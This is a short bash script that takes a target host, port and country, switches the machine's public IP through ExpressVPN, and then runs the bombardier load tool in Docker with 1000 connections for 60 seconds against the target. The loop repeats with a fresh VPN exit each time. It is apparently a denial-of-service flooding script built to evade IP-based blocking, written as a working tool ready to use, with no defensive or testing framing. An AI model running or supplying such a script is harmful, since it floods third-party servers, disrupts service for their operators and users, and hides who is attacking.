#! /bin/bash
while getopts t:p:c: flag
do
    case "${flag}" in
        t) target=${OPTARG};;
        p) port=${OPTARG};;
        c) country=${OPTARG};;
    esac
done

for i in {1..2}
do
	echo "IP now: "
	ipcurrent=`curl -s ifconfig.me`
    echo "$ipcurrent"
    sudo expressvpn connect $country
    ipnew=`curl -s  ifconfig.me`
    if [ "$ipcurrent" = "$ipnew" ]
    then
        #no change of the ip means vpn doesn't run -> break out of loop
        echo "Error: didn't manage to connect to the VPN. Check the name of the country or your expressVPN subscription again."
        break
    fi
    echo "IP now: "
    echo "$ipnew"
    echo -e "\n"
    sudo docker run -it alpine/bombardier -c 1000 -d 60s -l "$target:$port"
	sudo sleep 2
    sudo expressvpn disconnect
done


